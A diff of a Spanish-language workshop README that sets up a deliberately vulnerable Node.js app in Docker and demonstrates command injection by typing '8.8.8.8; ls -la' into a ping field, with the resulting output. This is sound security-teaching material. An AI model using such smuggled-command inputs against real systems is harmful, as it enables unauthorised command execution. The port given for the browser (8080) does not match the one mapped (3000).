@@ -44,10 +44,62 @@ _Nota:_ Algunos sistemas operativos requieren software adicional para instalar e
 
 Para el laboratorio vamos a utilizar una versión simplificada de la aplicación original: [Vulnerable NodeJS Applicaion](#https://github.com/payatu/vuln-nodejs-app). Si luego, deseas explorar más de 20 vulnerabilidades con su respectiva solución te recomiendo utilices su repositorio original; eso sí, vas a necesitar más recursos de tu computadora para correr los contenedores y también más espacio en disco.
 
-1. Vamos a clonar el repositorio haciendo uso de git clone y guardarlo en una carpeta snyk-workshop
+1. Utilizando la terminal o powershell en windows. Vamos a clonar el repositorio haciendo uso de git clone y guardarlo en una carpeta snyk-workshop
 
 ```
-git clone https://github.com/dan-breu/nodejs-cmd-injection  snyk-workshop
+git clone https://github.com/dan-breu/nodejs-cmd-injection snyk-workshop
+cd snyk-workshop
 ```
 
-2. Abrimos docker-desktop en nuestra computadora y creamos el contenedor
+2. Ahora abrimos docker-desktop en nuestra computadora y luego creamos el contenedor utilizando los siguientes comandos.
+
+```
+docker build .
+docker image ls
+docker run -d -p 3000:3000 <IMAGE_ID>
+docker ps -a
+```
+
+3. Abrimos un navegador e ingresamos a la dirección: localhost:8080. Nos debe mostrar la siguiente ventana.
+   ![Captura de Pantalla de Node JS Vulnerable](screenshot-nodecmdinj.png)
+
+4. En el primer campo de texto vamos a ingresar el siguiente comando.
+
+```
+8.8.8.8; ls -la
+```
+
+El resultado será el siguiente
+
+```
+Command Output
+
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=37 time=47.8 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=37 time=52.4 ms
+64 bytes from 8.8.8.8: icmp_seq=3 ttl=37 time=54.5 ms
+
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2013ms
+rtt min/avg/max/mdev = 47.771/51.549/54.511/2.811 ms
+Dockerfile
+README.md
+index.ejs
+node_modules
+package-lock.json
+package.json
+screenshot-nodecmdinj.png
+server.js
+serverfixed.js
+
+```
+
+Como podemos observar este campo de texto permite la ejecución de comandos propios del sistema. La razón es que el ingreso de texto en el campo no está limitado o sanitizado. Vamos bien hasta ahora.
+
+5. Si necesitamos borrar el contenedor y la imagen podemos utilizar los siguientes comandos.
+
+```
+docker stop <CONTAINER_ID>
+docker rm <CONTAINER_ID>
+docker image rm <IMAGE_ID>
+```
